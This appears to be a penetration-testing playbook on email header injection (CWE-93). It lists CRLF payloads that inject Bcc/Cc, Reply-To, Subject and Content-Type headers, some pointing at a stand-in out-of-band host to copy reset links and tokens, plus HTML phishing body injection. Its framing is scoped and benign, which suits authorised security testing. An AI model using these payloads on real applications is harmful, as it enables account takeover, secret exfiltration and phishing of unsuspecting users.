# Email / SMTP header injection (CWE-93 CRLF-adjacent — the email-header variant)

Abuse of a generated email where a **user-controlled value** (a From / Reply-To / Subject / Name / email
field, or any form input that is concatenated into the outbound message) reaches the email header block
WITHOUT stripping CR/LF. Injected `\r\n` (or often `\n` alone) splits the header block and lets the attacker
**add or override an email header** (`Bcc` / `Cc` / `Reply-To` / `Subject` / `Content-Type` / MIME boundary)
or break past the headers into the body. Where `flow-context` ENUMERATES which flows send an email that
carries user input, this skill EXPLOITS it: inject a header-breaking sequence against a **tester-owned**
recipient and confirm the injected header actually took effect. CWE-93 (CRLF injection) in its email-header
form; distinct from the HTTP-response CRLF / header-injection surface (a different class — see de-dup).

## Prime directive — the injected header TAKING EFFECT is the proof; a 200/accepted is NOT a finding
A form that returns `200`/`302` and does not show a validation error after a CRLF-ish payload is **not**
proof — the app may strip CR/LF downstream, the mailer library may reject the header, or nothing may be sent
at all. The finding exists only when the attacker-controlled header **actually took effect**, confirmed by one
of: a benign **copy** of the outbound mail arriving at a tester-owned mailbox (injected `Bcc`/`Cc`), a reply
**redirected** to a tester-owned mailbox (injected `Reply-To`), or the injected header **observably present**
in the delivered message (captured raw headers / rendered HTML from an injected `Content-Type`). Prove the
header break and its impact, not the acceptance. Keep every probe benign: a single confirming send, the
recipient under test, secrets in the captured mail redacted to fingerprints; never spoof mail to uninvolved
third parties, never mass-mail.

## The email-generation trust model (what breaks)
An app builds an outbound email by concatenating template-fixed headers (`To`, `From`, `Subject`, server-set
`Content-Type`) with user-supplied values, then hands the blob to a mailer/MTA. Three assumptions are
routinely unprotected:
1. **Header-value integrity** — a user value placed into a header (or used to build one) is not CR/LF-stripped,
   so `%0a`/`%0d%0a` in the value starts a NEW header line the attacker controls.
2. **Header-set is fixed** — the app assumes only its template headers exist; an injected `Bcc`/`Reply-To`/
   `Content-Type` is added or an existing one (`Subject`) is overridden.
3. **Header/body boundary** — a blank line (`%0d%0a%0d%0a`) ends the header block, so an injected sequence can
   force an HTML body (`Content-Type: text/html`) or split the MIME tree and attach attacker content.

## Ingest (from `flow_context.json` + recon)
- `flow-context/flow_context.json` — the modeled flows + the actions that send an email carrying user input
  (signup/verification, password-reset, contact/feedback, invite/team-invite, invoice/order, share/notify,
  newsletter). This is the feeder that says WHICH flow to probe and WHAT field lands in the mail.
- `js-analysis/out/<site>/findings/{endpoints,params,apis}.jsonl` + `content-discovery/` — the concrete
  forms/fields (`email`, `from`, `to`, `reply_to`, `name`, `subject`, `cc`) and endpoints behind each flow.
- `scope.yaml` — `oob.collaborator` (the tester OOB/SMTP+HTTP collector) and a tester-owned recipient mailbox.
```
jq '.actions[] | select(.sends_email==true or (.tags // [] | index("email")))' flow_context.json
```

## 1. Map the email-sending flows
Per in-scope flow: does submitting it generate an outbound email, and which user-controlled field(s) land in
the header block vs the body? Record the flow, the field, the carrier (HTML form, JSON body, query/path) and
the high-value payload the mail would carry — a **password-reset link/token, a magic-link login, an invoice,
or an invite** is the prize (Bcc-exfiltrating it is account-takeover-grade). (A field that reaches the mail
with no CR/LF handling = the vulnerable precondition; the acceptance test below is the proof.)

## 2. Bcc / Cc exfiltration (primary benign proof)
Inject a `Bcc`/`Cc` pointing at a tester-owned mailbox so a **copy** of the outbound mail is delivered to the
tester. Land the payload in a user-controlled From / email / Name / Subject field:
```
victim@t.example%0aBcc:tester@TOKEN.oob.example                   # LF only — common where the app pre-strips CR
victim@t.example%0d%0aBcc:tester@TOKEN.oob.example                # full CRLF
victim@t.example%0aCc:tester@TOKEN.oob.example                    # Cc variant
"name\r\nBcc: tester@TOKEN.oob.example"                           # raw CRLF where a quoted display-name is parsed
```
**Proof of effect:** a copy of the outbound mail arrives at the tester mailbox (or an attributable SMTP/HTTP
OOB beacon fires). High-value when the mail carries a secret — the reset link/token, magic-link, invite, or
invoice — redact that value to a fingerprint in the captured evidence.

## 3. Reply-To redirect
Inject a `Reply-To` so replies to the (legitimate) recipient land in a tester-owned mailbox — a
phishing-grade redirect that needs no body change:
```
victim@t.example%0aReply-To:tester@TOKEN.oob.example
```
**Proof of effect:** the delivered message's `Reply-To` is the tester address (captured raw headers), or a
test reply routes to the tester mailbox.

## 4. Subject / arbitrary header override
Inject a header that overrides a server-set one or adds a new trusted-looking header:
```
victim@t.example%0aSubject:Overwritten                            # override a server-set header
victim@t.example%0aX-Priority:1                                   # add an attacker header
```
**Proof of effect:** the delivered message shows the overridden/added header value.

## 5. Content-Type / MIME body & structure break
Force an HTML body or split the MIME tree to attach attacker content past the template's intended parts:
```
victim@t.example%0aContent-Type:text/html%0d%0a%0d%0a<h1>phish</h1>   # blank line ends headers → HTML body
victim@t.example%0aContent-Type:multipart/mixed;boundary=INJ...        # inject a boundary → split the MIME tree
```
**Proof of effect:** the delivered mail renders the attacker HTML (in-mail phishing), or the injected MIME
part is present in the delivered message. (If the injected HTML executes script in a webmail/app HTTP response
rather than the mail, that is an XSS finding → `xss-*`.)

## 6. Carrier & encoding notes
- **Carrier matters.** A value reflected onto the wire uses `%0d%0a`; a JSON/form field may need the raw bytes
  or `\r\n` depending on how the app decodes it — **try LF-only (`%0a`) first** (many apps strip CR but not LF),
  then full CRLF, then raw `\r\n`, then a null-byte prefix (`%00%0a…`) where a naive strip stops at the NUL.
- **Field choice.** Probe every user field that can reach the mail: `email`/`from`/`to`/`reply_to`/`cc`/`name`/
  `subject`/`message` (display-name and Subject are frequent because they feel "safe" to the developer).
- **One send.** Each confirmed technique needs a single confirming send to the tester mailbox — not a burst.

## 7. Confirm + rate (benign)
Confirmation = the injected header **took effect**, reproduced (≥2 benign sends), with the tester-mailbox copy
/ redirected reply / captured delivered-header recorded into `poc/<id>/` and any carried secret redacted to a
fingerprint. Rate by impact:
- **Bcc/Cc exfil of a secret-bearing mail** (reset link/token, magic-link, invoice, invite) → **High** (it is
  an account-takeover / sensitive-data-exfil primitive).
- **Reply-To redirect / forced-HTML in-mail phishing** → **Medium** (social-engineering primitive, no secret
  directly exfiltrated).
- **Header override with no demonstrated impact** → **Low**.
Rate from the demonstrated impact of the header that took effect, not from the mere acceptance of a payload.

## De-dup — hand these OFF (don't re-report)
| Observation | Owner |
|---|---|
| CR/LF that splits the **HTTP response** (response splitting / HTTP header injection / set-cookie) | a different class — the HTTP-response CRLF surface, NOT this skill |
| Attacker controls the **reset-link domain/host** via the `Host`/forwarding header (poisoned link URL) | `host-header` |
| Duplicated/polluted request parameters changing the parser's chosen value | `parameter-pollution` |
| Injected HTML/JS that **executes in a webmail/app HTTP response** (not the mail body) | `xss-*` |
| The exfiltrated secret's validity/impact (is the leaked reset token live?) | `secrets` / the owning auth class |
THIS skill keeps the **email header manipulation** itself + its mail-layer impact (secret-mail exfil via
`Bcc`/`Cc`, reply redirect, forced-HTML/MIME phishing) — CRLF into the SMTP/email header block, not a generic
HTTP header split.

## Cleanup
Any confirming mail is a single benign send to a tester-owned mailbox — delete the captured copies that carry
a real secret after fingerprinting, and record in `cleanup.md` that no mail reached an uninvolved third party.
Never leave a stored payload that would re-send on a later legitimate trigger (e.g. a persisted profile
display-name with an injected `Bcc`); if one was stored, remove it and record the removal.
